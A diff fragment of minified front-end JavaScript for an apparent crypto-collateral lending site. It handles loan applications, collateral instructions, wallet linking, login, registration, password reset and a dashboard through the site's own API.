+async function submitApplication(product){try{const d=await api('/api/applications',{method:'POST',body:JSON.stringify({product,amount:+$('applicationAmount').value,purpose:$('applicationPurpose').value,walletId:+$('applicationWallet').value,symbol:$('applicationSymbol').value,collateralAmount:$('applicationCollateral').value})});showPledge(d.application);$('modalBack').classList.add('show')}catch(e){$('modalMsg').innerHTML='<div class="notice">'+esc(e.message)+'</div>'}}
+function showPledge(app){$('modalKicker').textContent='COLLATERAL';$('modalTitle').textContent='Send collateral';$('modalBody').innerHTML=`<p class="muted">Send ${esc(app.collateral_amount)} ${esc(app.collateral_symbol)} to the address below from the linked wallet.</p><div class="wallet">${esc(app.collateral_address||'Address will appear after approval')}</div><button class="btn primary" style="width:100%;margin-top:16px" onclick="closeModal()">Done</button>`}
+async function removeLinkedWallet(id){try{await api('/api/linked-wallets/'+id,{method:'DELETE'});await loadLinkedWallets();toast('Wallet removed.')}catch(e){toast(e.message)}}
+function openLinkWallet(){if(!currentUser){openModal('login');return}$('modalKicker').textContent='WALLETS';$('modalTitle').textContent='Link a wallet';$('modalBody').innerHTML=`<p class="muted">Connect a wallet you control. This does not send funds.</p><div id="linkedWalletList"></div><button class="btn primary" style="width:100%;margin-top:16px" onclick="startWalletConnect()">Connect wallet</button><div id="modalMsg"></div>`;$('modalBack').classList.add('show');loadLinkedWallets()}
+async function startWalletConnect(){try{const d=await api('/api/linked-wallets/nonce');$('modalMsg').innerHTML='<div class="notice">Sign the message in your wallet.</div>';}catch(e){$('modalMsg').innerHTML='<div class="notice">'+esc(e.message)+'</div>'}}
+async function requestPasswordReset(){try{const d=await api('/api/password-reset/request',{method:'POST',body:JSON.stringify({email:$('resetEmail').value})});$('modalMsg').innerHTML='<div class="notice">'+esc(d.message)+'</div>'}catch(e){$('modalMsg').innerHTML='<div class="notice">'+esc(e.message)+'</div>'}}
+function toast(m){let t=document.createElement('div');t.className='toast';t.textContent=m;document.body.appendChild(t);setTimeout(()=>t.remove(),2800)}
+function loadSession(){api('/api/me').then(d=>{if(d.authenticated){currentUser=d.user;updateAuthUi();loadDashboard()}}).catch(()=>{})}
+async function loadDashboard(){try{const d=await api('/api/dashboard');availableCash=d.portfolio.available;if($('displayBalance'))$('displayBalance').textContent=money(d.portfolio.cash);if($('activityBody'))$('activityBody').innerHTML=d.activities.length?d.activities.map(a=>`<tr><td>${esc(a.activity)}</td><td>${esc(a.type)}</td><td>${money(a.amount)}</td><td><span class="badge">${esc(a.status)}</span></td></tr>`).join(''):'<tr><td colspan="4" class="muted">No activity yet.</td></tr>'}catch(_){}}
+async function login(){try{let d=await api('/api/login',{method:'POST',body:JSON.stringify({email:$('loginEmail').value,password:$('loginPassword').value})});currentUser=d.user;updateAuthUi();closeModal();await loadDashboard();toast('Welcome back, '+d.user.name+'.')}catch(e){$('modalMsg').innerHTML='<div class="notice">'+esc(e.message)+'</div>'}}
+async function register(){try{let d=await api('/api/register',{method:'POST',body:JSON.stringify({name:$('signupName').value,email:$('signupEmail').value,password:$('signupPassword').value})});currentUser=d.user;updateAuthUi();closeModal();await loadDashboard();toast('Welcome, '+d.user.name+'.')}catch(e){$('modalMsg').innerHTML='<div class="notice">'+esc(e.message)+'</div>'}}
+loadSession();
+</script>
